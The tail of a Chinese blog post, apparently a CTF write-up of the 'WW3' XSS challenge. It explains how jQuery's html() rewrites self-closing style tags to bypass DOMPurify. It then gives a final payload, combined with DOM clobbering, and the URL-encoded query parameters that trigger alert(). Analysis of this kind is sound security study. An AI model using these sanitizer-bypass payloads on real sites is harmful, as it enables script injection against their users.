+<h6 id="这段代码就是用来转换一些自闭合标签的标签，例如变成，我们就可以利用这个特性来实现一些绕过，例如："><a href="#这段代码就是用来转换一些自闭合标签的标签，例如变成，我们就可以利用这个特性来实现一些绕过，例如：" class="headerlink" title="这段代码就是用来转换一些自闭合标签的标签，例如变成，我们就可以利用这个特性来实现一些绕过，例如："></a>这段代码就是用来转换一些自闭合标签的标签，例如<blah>变成<blah></blah>，我们就可以利用这个特性来实现一些绕过，例如：</blah></h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span>Elon</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="经过innerHTML会变成"><a href="#经过innerHTML会变成" class="headerlink" title="经过innerHTML会变成"></a>经过innerHTML会变成</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">   <span class="tag">&lt;<span class="name">style</span>/&gt;</span>Elon</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="但是经过-jquery-html-就会变成"><a href="#但是经过-jquery-html-就会变成" class="headerlink" title="但是经过 jquery html() 就会变成"></a>但是经过 jquery html() 就会变成</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="xml">   <span class="tag">&lt;<span class="name">style</span>&gt;</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line">Elon</span><br></pre></td></tr></table></figure>
+
+<h6 id="我们可以发现通过html-可以把一些自闭合的拆分，以及把内容转换出去，有点类似于-mXSS-，最终我们得到的是"><a href="#我们可以发现通过html-可以把一些自闭合的拆分，以及把内容转换出去，有点类似于-mXSS-，最终我们得到的是" class="headerlink" title="我们可以发现通过html()可以把一些自闭合的拆分，以及把内容转换出去，有点类似于 mXSS ，最终我们得到的是"></a>我们可以发现通过html()可以把一些自闭合的拆分，以及把内容转换出去，有点类似于 mXSS ，最终我们得到的是</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span>Elon<span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="所以我们可以利用这个特性绕过-XSS-WAF，例如以下"><a href="#所以我们可以利用这个特性绕过-XSS-WAF，例如以下" class="headerlink" title="所以我们可以利用这个特性绕过 XSS WAF，例如以下"></a>所以我们可以利用这个特性绕过 XSS WAF，例如以下</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert()<span class="comment">//</span></span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="经过DOMPurify-sanitize我们可以得到"><a href="#经过DOMPurify-sanitize我们可以得到" class="headerlink" title="经过DOMPurify.sanitize我们可以得到"></a>经过DOMPurify.sanitize我们可以得到</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="number">1337</span>)<span class="comment">//</span></span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="经过-jquery-html-到最终渲染页面就变成了"><a href="#经过-jquery-html-到最终渲染页面就变成了" class="headerlink" title="经过 jquery html()到最终渲染页面就变成了"></a>经过 jquery html()到最终渲染页面就变成了</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>&gt;</span></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml">alert(1337)//<span class="tag">&lt;/<span class="name">style</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="所以这就是-JQuery’s-类似于-mXSS-的-trick"><a href="#所以这就是-JQuery’s-类似于-mXSS-的-trick" class="headerlink" title="所以这就是 JQuery’s 类似于 mXSS 的 trick"></a>所以这就是 JQuery’s 类似于 mXSS 的 trick</h6><h6 id="综上所述，配合我们之前的内容，最终-payload-如下："><a href="#综上所述，配合我们之前的内容，最终-payload-如下：" class="headerlink" title="综上所述，配合我们之前的内容，最终 payload 如下："></a>综上所述，配合我们之前的内容，最终 payload 如下：</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">name</span>=<span class="string">notify</span>&gt;</span><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">style</span>/&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert()<span class="comment">//</span></span></span></span><br></pre></td></tr></table></figure>
+
+<h6 id="最终传参"><a href="#最终传参" class="headerlink" title="最终传参:"></a>最终传参:</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">img=valid_img_url&amp;text=&lt;img name%3dnotify&gt;&lt;style&gt;&lt;style%2F&gt;&lt;script&gt;alert()%2F%2F</span><br></pre></td></tr></table></figure>
+
+<h6 id="这里我也不是非常清楚作者为啥要加一个-img-参数-全程没有用到"><a href="#这里我也不是非常清楚作者为啥要加一个-img-参数-全程没有用到" class="headerlink" title="这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到"></a>这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到</h6><h4 id="0x05参考链接"><a href="#0x05参考链接" class="headerlink" title="0x05参考链接"></a>0x05参考链接</h4><h6 id="https-www-anquanke-com-post-id-198496-h2-3"><a href="#https-www-anquanke-com-post-id-198496-h2-3" class="headerlink" title="https://www.anquanke.com/post/id/198496#h2-3"></a><a href="https://www.anquanke.com/post/id/198496#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/198496#h2-3</a></h6><h6 id="DOM-Clobbering-1"><a href="#DOM-Clobbering-1" class="headerlink" title="DOM Clobbering"></a><a href="http://www.thespanner.co.uk/2013/05/16/dom-clobbering/" target="_blank" rel="noopener">DOM Clobbering</a></h6><h6 id="HTMLAnchorElement"><a href="#HTMLAnchorElement" class="headerlink" title="HTMLAnchorElement"></a><a href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLAnchorElement" target="_blank" rel="noopener">HTMLAnchorElement</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/14/DOM-Clobbering学习记录/" rel="next" title="DOM Clobbering学习记录">
+                <i class="fa fa-chevron-left"></i> DOM Clobbering学习记录
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">45</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#0x01-Difficult-Version"><span class="nav-number">1.1.</span> <span class="nav-text">0x01 Difficult Version</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目的源码如下："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">题目的源码如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload如下："><span class="nav-number">1.1.0.2.</span> <span class="nav-text">payload如下：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x02-Keanu"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 Keanu</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码："><span class="nav-number">1.2.0.1.</span> <span class="nav-text">题目源码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#payload如下：-1"><span class="nav-number">1.2.0.2.</span> <span class="nav-text">payload如下：</span></a></li></ol></li></ol><li class="nav-item nav-level-4"><a class="nav-link" href="#0x03-WW3"><span class="nav-number">1.3.</span> <span class="nav-text">0x03 WW3</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#题目源码"><span class="nav-number">1.3.0.1.</span> <span class="nav-text">题目源码</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#审计代码，我们可以先看到题目定义的几个函数"><span class="nav-number">1.3.0.2.</span> <span class="nav-text">审计代码，我们可以先看到题目定义的几个函数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用来过滤我们的img参数"><span class="nav-number">1.3.0.3.</span> <span class="nav-text">用来过滤我们的img参数</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用来将我们传入的img-amp-text参数构造一个HTML模板"><span class="nav-number">1.3.0.4.</span> <span class="nav-text">用来将我们传入的img &amp; text参数构造一个HTML模板</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#用来进行-DOM-元素操作等，看起来我们的目标就是setTimeout函数中通过-“-notify”-html-html-来执行代码了，所以我们可能需要想办法把-notify-参数设置为-true。"><span class="nav-number">1.3.0.5.</span> <span class="nav-text">用来进行 DOM 元素操作等，看起来我们的目标就是setTimeout函数中通过$(“#notify”).html(html)来执行代码了，所以我们可能需要想办法把 notify 参数设置为 true。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#DOM-Clobbering"><span class="nav-number">1.3.1.</span> <span class="nav-text">DOM Clobbering</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#首先我们先来看看几个比较有趣的例子："><span class="nav-number">1.3.1.1.</span> <span class="nav-text">首先我们先来看看几个比较有趣的例子：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下："><span class="nav-number">1.3.1.2.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可以通过一些标签的id-name-属性来控制document-window-通过DOM-API-BOM-API-获取到的某个东西。"><span class="nav-number">1.3.1.3.</span> <span class="nav-text">可以通过一些标签的id(name)属性来控制document(window)通过DOM API(BOM API)获取到的某个东西。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#setTimeout"><span class="nav-number">1.3.2.</span> <span class="nav-text">setTimeout</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#我们了解了Dom-Clobberimg-之后，我们可以先看看可以怎么通过setTimeout来利用"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">我们了解了Dom Clobberimg 之后，我们可以先看看可以怎么通过setTimeout来利用</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简化了一下题目代码，对于以上的代码，我们可以通过利用Dom-Clobbering来实现XSS，因为我们可以直接传入id为ok的标签进行xss，例如传入"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">简化了一下题目代码，对于以上的代码，我们可以通过利用Dom Clobbering来实现XSS，因为我们可以直接传入id为ok的标签进行xss，例如传入</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#可是为什么呢？"><span class="nav-number">1.3.2.3.</span> <span class="nav-text">可是为什么呢？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#根据-MDN-文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据-Dom-Clobbering-，这里的ok应该是一个-a-标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据-MDN-文档-HTMLAnchorElement"><span class="nav-number">1.3.2.4.</span> <span class="nav-text">根据 MDN 文档，setTimeout的第一个参数，必须是个函数或字符串。可是根据 Dom Clobbering ，这里的ok应该是一个 a 标签，既然这不是个函数，它就尝试用toString方法转换成字符串，而根据 MDN 文档 HTMLAnchorElement</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#HTMLHyperlinkElementUtils-toString"><span class="nav-number">1.3.2.5.</span> <span class="nav-text">HTMLHyperlinkElementUtils.toString()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Returns-a-USVString-containing-the-whole-URL-It-is-a-synonym-for-HTMLHyperlinkElementUtils-href-though-it-can’t-be-used-to-modify-the-value"><span class="nav-number">1.3.2.6.</span> <span class="nav-text">Returns a USVString containing the whole URL. It is a synonym for HTMLHyperlinkElementUtils.href, though it can’t be used to modify the value.</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而当-a-标签通过toString-方法转换我们可以得到它的-href-属性，也就是javascript-alert-，所以我们就可以执行代码了。"><span class="nav-number">1.3.2.7.</span> <span class="nav-text">而当 a 标签通过toString()方法转换我们可以得到它的 href 属性，也就是javascript:alert()，所以我们就可以执行代码了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#例如："><span class="nav-number">1.3.2.8.</span> <span class="nav-text">例如：</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#notify"><span class="nav-number">1.3.3.</span> <span class="nav-text">notify</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#好了，回到我们的-notify-上，虽然我们可以通过-DOM-Clobbering-进行”污染”一些参数，但是题目直接规定了let-notify-false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？"><span class="nav-number">1.3.3.1.</span> <span class="nav-text">好了，回到我们的 notify 上，虽然我们可以通过 DOM Clobbering 进行”污染”一些参数，但是题目直接规定了let notify = false，浏览器当然也不可能允许我们修改服务端的代码，这可怎么办？</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其实这里的-notify-比较具有误导性，比较像-C-语言入门的时候函数传参部分，我们把整个代码改一下："><span class="nav-number">1.3.3.2.</span> <span class="nav-text">其实这里的 notify 比较具有误导性，比较像 C 语言入门的时候函数传参部分，我们把整个代码改一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#再简化一下就成了我们的C语言函数传参的练习题了"><span class="nav-number">1.3.3.3.</span> <span class="nav-text">再简化一下就成了我们的C语言函数传参的练习题了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的-Javascript-Scope-部分，该函数内的notify参数变量取决于该函数所在的作用域。"><span class="nav-number">1.3.3.4.</span> <span class="nav-text">为了易于理解我们可以写成这样就不易弄混了，所以，对于memeGen来说，notify只是一个参数变量名，区别于我们一开始提到的 Javascript Scope 部分，该函数内的notify参数变量取决于该函数所在的作用域。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#而对于memeGen函数来说，它的作用域并非是在let-notify-false所处的-JS-代码域当中，而是在通过document-write函数之后的作用域，所以这里就涉及到了作用域的问题。"><span class="nav-number">1.3.3.5.</span> <span class="nav-text">而对于memeGen函数来说，它的作用域并非是在let notify = false所处的 JS 代码域当中，而是在通过document.write函数之后的作用域，所以这里就涉及到了作用域的问题。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#javaScript-Scope"><span class="nav-number">1.3.4.</span> <span class="nav-text">javaScript Scope</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#所以对于执行document-write函数过后，也就是对于onload-memeGen函数来说，其作用域并非是-JS-的作用域，在题目中本来这么几个作用域：window、script、onload，其中-window-包含了后两个，后两个互不包含，所以这里在-onload-找不到-notify-变量，就会去-window-的作用域找，就会把-script-作用域当中的-notify-给找到，notify-变量也就成-false-了。"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">所以对于执行document.write函数过后，也就是对于onload=memeGen函数来说，其作用域并非是 JS 的作用域，在题目中本来这么几个作用域：window、script、onload，其中 window 包含了后两个，后两个互不包含，所以这里在 onload 找不到 notify 变量，就会去 window 的作用域找，就会把 script 作用域当中的 notify 给找到，notify 变量也就成 false 了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们也可以通过一个简单的例子来理解："><span class="nav-number">1.3.4.2.</span> <span class="nav-text">我们也可以通过一个简单的例子来理解：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#结果如下：-1"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">结果如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#原理都是一样的，这里test函数在onerror作用域找到了-x-变量，所以就不会再去找-window-作用域下的-x-false变量了，所以本题我们需要引入一个name-notify的标签来“覆盖”掉原来的-notify-变量。"><span class="nav-number">1.3.4.4.</span> <span class="nav-text">原理都是一样的，这里test函数在onerror作用域找到了 x 变量，所以就不会再去找 window 作用域下的 x=false变量了，所以本题我们需要引入一个name=notify的标签来“覆盖”掉原来的 notify 变量。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是-text-amp-img"><span class="nav-number">1.3.4.5.</span> <span class="nav-text">其实这也是一开始我们可以发现题目给出的代码有一处也比较神奇就是 text &amp; img</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#memeGen函数在函数内找不到text，onload-的作用域也找不到text，就会去-script下面找，而多个-script-属于同一个作用域，所以对于函数当中的-text-以及-img-，它是在下一块-JS-代码段定义的。"><span class="nav-number">1.3.4.6.</span> <span class="nav-text">memeGen函数在函数内找不到text，onload 的作用域也找不到text，就会去 script下面找，而多个 script 属于同一个作用域，所以对于函数当中的 text 以及 img ，它是在下一块 JS 代码段定义的。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#JQuery-39-s-39-mXSS-39"><span class="nav-number">1.3.5.</span> <span class="nav-text">JQuery&#39;s &#39;mXSS&#39;</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#所以基本上-notify-的问题我们解决了，接下来就是-DOM-Purify-的问题了。"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">所以基本上 notify 的问题我们解决了，接下来就是 DOM Purify 的问题了。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以知道最终我们要插入的代码是通过-“-notify”-html-html-来插入的，而参数-html-又来自"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">我们可以知道最终我们要插入的代码是通过$(“#notify”).html(html)来插入的，而参数 html 又来自</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#简单跟一下-JQuery-的-html-函数，我们可以发现有以下利用链："><span class="nav-number">1.3.5.3.</span> <span class="nav-text">简单跟一下 JQuery 的 html() 函数，我们可以发现有以下利用链：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#html-gt-append-gt-doManip-gt-buildFragment-gt-htmlPrefilter"><span class="nav-number">1.3.5.4.</span> <span class="nav-text">html()-&gt;append()-&gt;doManip()-&gt;buildFragment()-&gt;htmlPrefilter()</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在htmlPrefilter-函数中我们可以看到有这么一段代码："><span class="nav-number">1.3.5.5.</span> <span class="nav-text">在htmlPrefilter()函数中我们可以看到有这么一段代码：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这段代码就是用来转换一些自闭合标签的标签，例如变成，我们就可以利用这个特性来实现一些绕过，例如："><span class="nav-number">1.3.5.6.</span> <span class="nav-text">这段代码就是用来转换一些自闭合标签的标签，例如变成，我们就可以利用这个特性来实现一些绕过，例如：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过innerHTML会变成"><span class="nav-number">1.3.5.7.</span> <span class="nav-text">经过innerHTML会变成</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是经过-jquery-html-就会变成"><span class="nav-number">1.3.5.8.</span> <span class="nav-text">但是经过 jquery html() 就会变成</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#我们可以发现通过html-可以把一些自闭合的拆分，以及把内容转换出去，有点类似于-mXSS-，最终我们得到的是"><span class="nav-number">1.3.5.9.</span> <span class="nav-text">我们可以发现通过html()可以把一些自闭合的拆分，以及把内容转换出去，有点类似于 mXSS ，最终我们得到的是</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以我们可以利用这个特性绕过-XSS-WAF，例如以下"><span class="nav-number">1.3.5.10.</span> <span class="nav-text">所以我们可以利用这个特性绕过 XSS WAF，例如以下</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过DOMPurify-sanitize我们可以得到"><span class="nav-number">1.3.5.11.</span> <span class="nav-text">经过DOMPurify.sanitize我们可以得到</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#经过-jquery-html-到最终渲染页面就变成了"><span class="nav-number">1.3.5.12.</span> <span class="nav-text">经过 jquery html()到最终渲染页面就变成了</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#所以这就是-JQuery’s-类似于-mXSS-的-trick"><span class="nav-number">1.3.5.13.</span> <span class="nav-text">所以这就是 JQuery’s 类似于 mXSS 的 trick</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#综上所述，配合我们之前的内容，最终-payload-如下："><span class="nav-number">1.3.5.14.</span> <span class="nav-text">综上所述，配合我们之前的内容，最终 payload 如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#最终传参"><span class="nav-number">1.3.5.15.</span> <span class="nav-text">最终传参:</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这里我也不是非常清楚作者为啥要加一个-img-参数-全程没有用到"><span class="nav-number">1.3.5.16.</span> <span class="nav-text">这里我也不是非常清楚作者为啥要加一个 img 参数//全程没有用到</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#0x05参考链接"><span class="nav-number">1.4.</span> <span class="nav-text">0x05参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-anquanke-com-post-id-198496-h2-3"><span class="nav-number">1.4.0.1.</span> <span class="nav-text">https://www.anquanke.com/post/id/198496#h2-3</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#DOM-Clobbering-1"><span class="nav-number">1.4.0.2.</span> <span class="nav-text">DOM Clobbering</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#HTMLAnchorElement"><span class="nav-number">1.4.0.3.</span> <span class="nav-text">HTMLAnchorElement</span></a></li></ol></li></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">162.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
